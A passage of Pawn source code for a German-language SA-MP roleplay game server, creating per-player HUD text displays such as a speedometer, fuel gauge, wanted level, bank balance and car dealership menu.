	PlayerTextDrawSetProportional(playerid,Bankklau[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid,Bankklau[playerid][0], 1);
	PlayerTextDrawUseBox(playerid,Bankklau[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid,Bankklau[playerid][0], 190);
	PlayerTextDrawTextSize(playerid,Bankklau[playerid][0], 551.000000, 0.000000);

	Bankklau[playerid][1] = CreatePlayerTextDraw(playerid,555.000000, 118.000000, "0.00");
	PlayerTextDrawBackgroundColor(playerid,Bankklau[playerid][1], -1);
	PlayerTextDrawFont(playerid,Bankklau[playerid][1], 3);
	PlayerTextDrawLetterSize(playerid,Bankklau[playerid][1], 0.270000, 1.100000);
	PlayerTextDrawColor(playerid,Bankklau[playerid][1], 6684927);
	PlayerTextDrawSetOutline(playerid,Bankklau[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid,Bankklau[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid,Bankklau[playerid][1], 0);



	Ladebalken[playerid][0] = CreatePlayerTextDraw(playerid,265.000000, 169.000000, "_");
	PlayerTextDrawFont(playerid,Ladebalken[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid,Ladebalken[playerid][0], 5.600000, 2.000000);
	PlayerTextDrawTextSize(playerid,Ladebalken[playerid][0], 367.000000, 25.000000);
	PlayerTextDrawSetOutline(playerid,Ladebalken[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid,Ladebalken[playerid][0], 0);
	PlayerTextDrawAlignment(playerid,Ladebalken[playerid][0], 1);
	PlayerTextDrawColor(playerid,Ladebalken[playerid][0], -1);
	PlayerTextDrawBackgroundColor(playerid,Ladebalken[playerid][0], 255);
	PlayerTextDrawBoxColor(playerid,Ladebalken[playerid][0], 0x141414AA);
	PlayerTextDrawUseBox(playerid,Ladebalken[playerid][0], 1);
	PlayerTextDrawSetProportional(playerid,Ladebalken[playerid][0], 1);
	PlayerTextDrawSetSelectable(playerid,Ladebalken[playerid][0], 0);

	Ladebalken[playerid][1] = CreatePlayerTextDraw(playerid,267.000000, 171.000000, "_");
	PlayerTextDrawFont(playerid,Ladebalken[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid,Ladebalken[playerid][1], 5.600000, 1.5);
	PlayerTextDrawTextSize(playerid,Ladebalken[playerid][1], 365.500000, 24.000000);
	PlayerTextDrawSetOutline(playerid,Ladebalken[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid,Ladebalken[playerid][1], 0);
	PlayerTextDrawAlignment(playerid,Ladebalken[playerid][1], 1);
	PlayerTextDrawColor(playerid,Ladebalken[playerid][1], -1);
	PlayerTextDrawBackgroundColor(playerid,Ladebalken[playerid][1], 255);
	PlayerTextDrawBoxColor(playerid,Ladebalken[playerid][1], 0x23B500AA);
	PlayerTextDrawUseBox(playerid,Ladebalken[playerid][1], 1);
	PlayerTextDrawSetProportional(playerid,Ladebalken[playerid][1], 1);
	PlayerTextDrawSetSelectable(playerid,Ladebalken[playerid][1], 0);

	Ladebalken[playerid][2] = CreatePlayerTextDraw(playerid,301.000000, 172.000000, "100L");
	PlayerTextDrawFont(playerid,Ladebalken[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid,Ladebalken[playerid][2], 0.387500, 1.100000);
	PlayerTextDrawTextSize(playerid,Ladebalken[playerid][2], 334.000000, 17.000000);
	PlayerTextDrawSetOutline(playerid,Ladebalken[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid,Ladebalken[playerid][2], 0);
	PlayerTextDrawAlignment(playerid,Ladebalken[playerid][2], 1);
	PlayerTextDrawColor(playerid,Ladebalken[playerid][2], 0xFEFEFEFF);
	PlayerTextDrawBackgroundColor(playerid,Ladebalken[playerid][2], 255);
	PlayerTextDrawUseBox(playerid,Ladebalken[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid,Ladebalken[playerid][2], 1);
	PlayerTextDrawSetSelectable(playerid,Ladebalken[playerid][2], 0);


	Wantedtext[0][playerid] = CreatePlayerTextDraw(playerid,558.000000, 104.000000, "");
	PlayerTextDrawBackgroundColor(playerid,Wantedtext[0][playerid], 255);
	PlayerTextDrawFont(playerid,Wantedtext[0][playerid], 2);
	PlayerTextDrawLetterSize(playerid,Wantedtext[0][playerid], 0.180000, 1.299999);
	PlayerTextDrawColor(playerid,Wantedtext[0][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Wantedtext[0][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Wantedtext[0][playerid], 1);
	PlayerTextDrawSetShadow(playerid,Wantedtext[0][playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Wantedtext[0][playerid], 0);

	Wantedtext[1][playerid] = CreatePlayerTextDraw(playerid,546.000000, 104.000000, "]");
	PlayerTextDrawBackgroundColor(playerid,Wantedtext[1][playerid], 255);
	PlayerTextDrawFont(playerid,Wantedtext[1][playerid], 2);
	PlayerTextDrawLetterSize(playerid,Wantedtext[1][playerid], 0.320000, 1.300000);
	PlayerTextDrawColor(playerid,Wantedtext[1][playerid], -659023873);
	PlayerTextDrawSetOutline(playerid,Wantedtext[1][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Wantedtext[1][playerid], 1);
	PlayerTextDrawSetShadow(playerid,Wantedtext[1][playerid], 0);
	PlayerTextDrawSetSelectable(playerid,Wantedtext[1][playerid], 0);

	Orttext[playerid] = CreatePlayerTextDraw(playerid,45.000000, 435.000000, "Ort: Santa Felton");
	PlayerTextDrawBackgroundColor(playerid,Orttext[playerid], 255);
	PlayerTextDrawFont(playerid,Orttext[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Orttext[playerid], 0.240000, 1.200000);
	PlayerTextDrawColor(playerid,Orttext[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Orttext[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Orttext[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Orttext[playerid], 0);

	GeldAnzeigewert[playerid] = CreatePlayerTextDraw(playerid,512.000000, 80.000000, "0.00");
	PlayerTextDrawBackgroundColor(playerid,GeldAnzeigewert[playerid], 9961727);
	PlayerTextDrawFont(playerid,GeldAnzeigewert[playerid], 2);
	PlayerTextDrawLetterSize(playerid,GeldAnzeigewert[playerid], 0.260000, 1.700000);
	PlayerTextDrawColor(playerid,GeldAnzeigewert[playerid], -1);
	PlayerTextDrawSetOutline(playerid,GeldAnzeigewert[playerid], 0);
	PlayerTextDrawSetProportional(playerid,GeldAnzeigewert[playerid], 1);
	PlayerTextDrawSetShadow(playerid,GeldAnzeigewert[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,GeldAnzeigewert[playerid], 0);

	Hungeranzeige[playerid] = CreatePlayerTextDraw(playerid,607.00, 59.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Hungeranzeige[playerid], 255);
	PlayerTextDrawFont(playerid,Hungeranzeige[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Hungeranzeige[playerid], 0.549998, 0.099999);
	PlayerTextDrawColor(playerid,Hungeranzeige[playerid], -65281);
	PlayerTextDrawSetOutline(playerid,Hungeranzeige[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Hungeranzeige[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Hungeranzeige[playerid], 1);
	PlayerTextDrawUseBox(playerid,Hungeranzeige[playerid], 1);
	PlayerTextDrawBoxColor(playerid,Hungeranzeige[playerid], -65281);
	PlayerTextDrawTextSize(playerid,Hungeranzeige[playerid], 546.000000, 5.000000);



	TachoText[playerid][0] = CreatePlayerTextDraw(playerid,662.000000, 332.000000, "New TextDraw");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][0], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][0], 0.500000, 4.999999);
	PlayerTextDrawColor(playerid,TachoText[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][0], 1);
	PlayerTextDrawUseBox(playerid,TachoText[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid,TachoText[playerid][0], 1711276272);
	PlayerTextDrawTextSize(playerid,TachoText[playerid][0], 531.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][0], 0);

	TachoText[playerid][1] = CreatePlayerTextDraw(playerid,662.000000, 333.000000, "New TextDraw");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][1], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][1], 0.500000, 4.899999);
	PlayerTextDrawColor(playerid,TachoText[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][1], 1);
	PlayerTextDrawUseBox(playerid,TachoText[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid,TachoText[playerid][1], 218959359);
	PlayerTextDrawTextSize(playerid,TachoText[playerid][1], 532.000000, -3.000000);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][1], 0);

	TachoText[playerid][2] = CreatePlayerTextDraw(playerid,747.000000, 333.000000, "New TextDraw");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][2], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][2], 1.110000, -0.099999);
	PlayerTextDrawColor(playerid,TachoText[playerid][2], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][2], 1);
	PlayerTextDrawUseBox(playerid,TachoText[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid,TachoText[playerid][2], -206);
	PlayerTextDrawTextSize(playerid,TachoText[playerid][2], 532.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][2], 0);

	TachoText[playerid][3] = CreatePlayerTextDraw(playerid,747.000000, 423.000000, "New TextDraw");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][3], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][3], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][3], 1.110000, -0.099999);
	PlayerTextDrawColor(playerid,TachoText[playerid][3], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][3], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][3], 1);
	PlayerTextDrawUseBox(playerid,TachoText[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid,TachoText[playerid][3], -236);
	PlayerTextDrawTextSize(playerid,TachoText[playerid][3], 532.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][3], 0);

	TachoText[playerid][4] = CreatePlayerTextDraw(playerid,747.000000, 351.000000, "New TextDraw");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][4], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][4], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][4], 1.110000, -0.199999);
	PlayerTextDrawColor(playerid,TachoText[playerid][4], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][4], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][4], 1);
	PlayerTextDrawUseBox(playerid,TachoText[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid,TachoText[playerid][4], -236);
	PlayerTextDrawTextSize(playerid,TachoText[playerid][4], 532.000000, 8.000000);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][4], 0);

	TachoText[playerid][5] = CreatePlayerTextDraw(playerid,537.000000, 334.000000, "Streifenwagen LS");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][5], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][5], 2);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][5], 0.250000, 1.500000);
	PlayerTextDrawColor(playerid,TachoText[playerid][5], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][5], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][5], 0);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][5], 0);

	TachoText[playerid][6] = CreatePlayerTextDraw(playerid,536.000000, 356.000000, "Tageskilometer: 0");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][6], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][6], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][6], 0.159999, 0.899999);
	PlayerTextDrawColor(playerid,TachoText[playerid][6], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][6], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][6], 0);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][6], 0);

	TachoText[playerid][7] = CreatePlayerTextDraw(playerid,550.000000, 365.000000, "Kilometer: 0");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][7], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][7], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][7], 0.159999, 0.899999);
	PlayerTextDrawColor(playerid,TachoText[playerid][7], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][7], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][7], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][7], 0);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][7], 0);

	TachoText[playerid][8] = CreatePlayerTextDraw(playerid,607.000000, 356.000000, "Motor: aus");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][8], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][8], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][8], 0.159999, 0.899999);
	PlayerTextDrawColor(playerid,TachoText[playerid][8], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][8], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][8], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][8], 0);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][8], 0);

	TachoText[playerid][9] = CreatePlayerTextDraw(playerid,611.000000, 365.000000, "Licht: aus");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][9], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][9], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][9], 0.159999, 0.899999);
	PlayerTextDrawColor(playerid,TachoText[playerid][9], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][9], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][9], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][9], 0);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][9], 0);

	TachoText[playerid][10] = CreatePlayerTextDraw(playerid,747.000000, 383.000000, "New TextDraw");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][10], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][10], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][10], 1.110000, -0.199999);
	PlayerTextDrawColor(playerid,TachoText[playerid][10], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][10], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][10], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][10], 1);
	PlayerTextDrawUseBox(playerid,TachoText[playerid][10], 1);
	PlayerTextDrawBoxColor(playerid,TachoText[playerid][10], -236);
	PlayerTextDrawTextSize(playerid,TachoText[playerid][10], 532.000000, 8.000000);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][10], 0);

	TachoText[playerid][11] = CreatePlayerTextDraw(playerid,537.000000, 393.000000, "127 KM/H");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][11], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][11], 2);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][11], 0.159999, 1.499999);
	PlayerTextDrawColor(playerid,TachoText[playerid][11], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][11], 1);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][11], 1);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][11], 0);

	TachoText[playerid][12] = CreatePlayerTextDraw(playerid,570.000000, 408.000000, "iconWerkzeug");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][12], 0);
	PlayerTextDrawFont(playerid,TachoText[playerid][12], 5);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][12], -1.300000, -17.000000);
	PlayerTextDrawColor(playerid,TachoText[playerid][12], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][12], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][12], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][12], 0);
	PlayerTextDrawUseBox(playerid,TachoText[playerid][12], 0);
	PlayerTextDrawBoxColor(playerid,TachoText[playerid][12], -16776961);
	PlayerTextDrawTextSize(playerid,TachoText[playerid][12], 24.000000, 12.000000);
	PlayerTextDrawSetPreviewModel(playerid,TachoText[playerid][12], 19627);
	PlayerTextDrawSetPreviewRot(playerid,TachoText[playerid][12], 90.000000, 180.000000, 90.000000, 1.000000);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][12], 0);


	TachoText[playerid][13] = CreatePlayerTextDraw(playerid,588.000000, 410.000000, "100%");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][13], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][13], 2);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][13], 0.210000, 0.799999);
	PlayerTextDrawColor(playerid,TachoText[playerid][13], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][13], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][13], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][13], 1);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][13], 0);

	TachoText[playerid][14] = CreatePlayerTextDraw(playerid,588.000000, 398.000000, "1000/1000L");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][14], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][14], 2);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][14], 0.210000, 0.799999);
	PlayerTextDrawColor(playerid,TachoText[playerid][14], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][14], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][14], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][14], 1);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][14], 0);

	TachoText[playerid][15] = CreatePlayerTextDraw(playerid,588.000000, 386.000000, "abgeschlossen");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][15], 255);
	PlayerTextDrawFont(playerid,TachoText[playerid][15], 1);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][15], 0.210000, 0.799999);
	PlayerTextDrawColor(playerid,TachoText[playerid][15], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][15], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][15], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][15], 0);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][15], 0);

	TachoText[playerid][16] = CreatePlayerTextDraw(playerid,574.000000, 383.000000, "New TextDraw");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][16], -256);
	PlayerTextDrawFont(playerid,TachoText[playerid][16], 5);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][16], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TachoText[playerid][16], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][16], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][16], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][16], 0);
	PlayerTextDrawUseBox(playerid,TachoText[playerid][16], 0);
	PlayerTextDrawBoxColor(playerid,TachoText[playerid][16], 255);
	PlayerTextDrawTextSize(playerid,TachoText[playerid][16], 16.000000, 13.000000);
	PlayerTextDrawSetPreviewModel(playerid,TachoText[playerid][16], 19804);
	PlayerTextDrawSetPreviewRot(playerid,TachoText[playerid][16], 0.000000, 0.000000, 0.000000, 1.000000);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][16], 0);

	TachoText[playerid][17] = CreatePlayerTextDraw(playerid,575.000000, 394.000000, "New TextDraw");
	PlayerTextDrawBackgroundColor(playerid,TachoText[playerid][17], -256);
	PlayerTextDrawFont(playerid,TachoText[playerid][17], 5);
	PlayerTextDrawLetterSize(playerid,TachoText[playerid][17], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TachoText[playerid][17], -1);
	PlayerTextDrawSetOutline(playerid,TachoText[playerid][17], 0);
	PlayerTextDrawSetProportional(playerid,TachoText[playerid][17], 1);
	PlayerTextDrawSetShadow(playerid,TachoText[playerid][17], 1);
	PlayerTextDrawUseBox(playerid,TachoText[playerid][17], 0);
	PlayerTextDrawBoxColor(playerid,TachoText[playerid][17], 255);
	PlayerTextDrawTextSize(playerid,TachoText[playerid][17], 13.000000, 14.000000);
	PlayerTextDrawSetPreviewModel(playerid,TachoText[playerid][17], 1650);
	PlayerTextDrawSetPreviewRot(playerid,TachoText[playerid][17], 0.000000, 0.000000, 0.000000, 1.000000);
	PlayerTextDrawSetSelectable(playerid,TachoText[playerid][17], 0);

	/*UserBr[13] = TextDrawCreate(-7.000000, 421.000000, "_"); //Koffer
	TextDrawBackgroundColor(UserBr[13], 0);
	TextDrawFont(UserBr[13], 5);
	TextDrawLetterSize(UserBr[13], 1.740000, 3.900000);
	TextDrawColor(UserBr[13], -328859393);
	TextDrawSetOutline(UserBr[13], 0);
	TextDrawSetProportional(UserBr[13], 0);
	TextDrawSetShadow(UserBr[13], 1);
	TextDrawUseBox(UserBr[13], 1);
	TextDrawBoxColor(UserBr[13], -1);
	TextDrawTextSize(UserBr[13], 43.000000, 36.000000);
	TextDrawSetPreviewModel(UserBr[13], 1210);
	TextDrawSetPreviewRot(UserBr[13], 1.000000, 1.000000, 1.000000, 1.000000);
	TextDrawSetSelectable(UserBr[13], 1);*/



	Bankmenu_Stand[playerid] = CreatePlayerTextDraw(playerid,149.000000, 245.000000, "Kontostand: 15364.55 $");
	PlayerTextDrawBackgroundColor(playerid,Bankmenu_Stand[playerid], 255);
	PlayerTextDrawFont(playerid,Bankmenu_Stand[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Bankmenu_Stand[playerid], 0.509998, 1.299999);
	PlayerTextDrawColor(playerid,Bankmenu_Stand[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Bankmenu_Stand[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Bankmenu_Stand[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Bankmenu_Stand[playerid], 1);
	ATMmenu_Stand[playerid] = CreatePlayerTextDraw(playerid,149.000000, 220.000000, "Kontostand: 15364.55 $");//149 245
	PlayerTextDrawBackgroundColor(playerid,ATMmenu_Stand[playerid], 255);
	PlayerTextDrawFont(playerid,ATMmenu_Stand[playerid], 1);
	PlayerTextDrawLetterSize(playerid,ATMmenu_Stand[playerid], 0.509998, 1.299999);
	PlayerTextDrawColor(playerid,ATMmenu_Stand[playerid], -1);
	PlayerTextDrawSetOutline(playerid,ATMmenu_Stand[playerid], 0);
	PlayerTextDrawSetProportional(playerid,ATMmenu_Stand[playerid], 1);
	PlayerTextDrawSetShadow(playerid,ATMmenu_Stand[playerid], 1);
	Autohaus[playerid][0] = CreatePlayerTextDraw(playerid,567.000000, 330.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Autohaus[playerid][0], 255);
	PlayerTextDrawFont(playerid,Autohaus[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid,Autohaus[playerid][0], 0.500000, 9.500000);
	PlayerTextDrawColor(playerid,Autohaus[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid,Autohaus[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid,Autohaus[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid,Autohaus[playerid][0], 1);
	PlayerTextDrawUseBox(playerid,Autohaus[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid,Autohaus[playerid][0], 150);
	PlayerTextDrawTextSize(playerid,Autohaus[playerid][0], 170.000000, 0.000000);
	Autohaus[playerid][1] = CreatePlayerTextDraw(playerid,183.000000, 333.000000, "Autoname: Infernus");
	PlayerTextDrawBackgroundColor(playerid,Autohaus[playerid][1], 255);
	PlayerTextDrawFont(playerid,Autohaus[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid,Autohaus[playerid][1], 0.569999, 2.100000);
	PlayerTextDrawColor(playerid,Autohaus[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid,Autohaus[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid,Autohaus[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid,Autohaus[playerid][1], 0);
	Autohaus[playerid][2] = CreatePlayerTextDraw(playerid,183.000000, 355.000000, "Preis: 150000");
	PlayerTextDrawBackgroundColor(playerid,Autohaus[playerid][2], 255);
	PlayerTextDrawFont(playerid,Autohaus[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid,Autohaus[playerid][2], 0.569999, 2.100000);
	PlayerTextDrawColor(playerid,Autohaus[playerid][2], -1);
	PlayerTextDrawSetOutline(playerid,Autohaus[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid,Autohaus[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid,Autohaus[playerid][2], 0);
	Autohaus[playerid][3] = CreatePlayerTextDraw(playerid,183.000000, 377.000000, "Kraftstoff: Diesel");
	PlayerTextDrawBackgroundColor(playerid,Autohaus[playerid][3], 255);
	PlayerTextDrawFont(playerid,Autohaus[playerid][3], 1);
	PlayerTextDrawLetterSize(playerid,Autohaus[playerid][3], 0.569999, 2.100000);
	PlayerTextDrawColor(playerid,Autohaus[playerid][3], -1);
	PlayerTextDrawSetOutline(playerid,Autohaus[playerid][3], 0);
	PlayerTextDrawSetProportional(playerid,Autohaus[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid,Autohaus[playerid][3], 0);
	Autohaus[playerid][4] = CreatePlayerTextDraw(playerid,398.000000, 333.000000, "Tankmenge: 70L");
	PlayerTextDrawBackgroundColor(playerid,Autohaus[playerid][4], 255);
	PlayerTextDrawFont(playerid,Autohaus[playerid][4], 1);
	PlayerTextDrawLetterSize(playerid,Autohaus[playerid][4], 0.569999, 2.100000);
	PlayerTextDrawColor(playerid,Autohaus[playerid][4], -1);
	PlayerTextDrawSetOutline(playerid,Autohaus[playerid][4], 0);
	PlayerTextDrawSetProportional(playerid,Autohaus[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid,Autohaus[playerid][4], 0);
	Autohaus[playerid][5] = CreatePlayerTextDraw(playerid,398.000000, 356.000000, "Verbrauch: 17L");
	PlayerTextDrawBackgroundColor(playerid,Autohaus[playerid][5], 255);
	PlayerTextDrawFont(playerid,Autohaus[playerid][5], 1);
	PlayerTextDrawLetterSize(playerid,Autohaus[playerid][5], 0.569999, 2.100000);
	PlayerTextDrawColor(playerid,Autohaus[playerid][5], -1);
	PlayerTextDrawSetOutline(playerid,Autohaus[playerid][5], 0);
	PlayerTextDrawSetProportional(playerid,Autohaus[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid,Autohaus[playerid][5], 0);
	Autohaus[playerid][6] = CreatePlayerTextDraw(playerid,398.000000, 376.000000, "Max km/h: 235");
	PlayerTextDrawBackgroundColor(playerid,Autohaus[playerid][6], 255);
	PlayerTextDrawFont(playerid,Autohaus[playerid][6], 1);
	PlayerTextDrawLetterSize(playerid,Autohaus[playerid][6], 0.569999, 2.100000);
	PlayerTextDrawColor(playerid,Autohaus[playerid][6], -1);
	PlayerTextDrawSetOutline(playerid,Autohaus[playerid][6], 0);
	PlayerTextDrawSetProportional(playerid,Autohaus[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid,Autohaus[playerid][6], 0);
	Autohaus[playerid][7] = CreatePlayerTextDraw(playerid,171.000000, 59.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Autohaus[playerid][7], 255);
	PlayerTextDrawFont(playerid,Autohaus[playerid][7], 5);
	PlayerTextDrawLetterSize(playerid,Autohaus[playerid][7], 0.500000, 80.900001);
	PlayerTextDrawColor(playerid,Autohaus[playerid][7], -1);
	PlayerTextDrawSetOutline(playerid,Autohaus[playerid][7], 0);
	PlayerTextDrawSetProportional(playerid,Autohaus[playerid][7], 1);
	PlayerTextDrawSetShadow(playerid,Autohaus[playerid][7], 1);
	PlayerTextDrawUseBox(playerid,Autohaus[playerid][7], 1);
	PlayerTextDrawBoxColor(playerid,Autohaus[playerid][7], 0xFFFFFF00);
	PlayerTextDrawTextSize(playerid,Autohaus[playerid][7], 395.000000, 270.000000);
	PlayerTextDrawSetPreviewModel(playerid,Autohaus[playerid][7], 411);
	PlayerTextDrawSetPreviewRot(playerid,Autohaus[playerid][7], -16.000000, 0.000000, -55.000000, 1.000000);
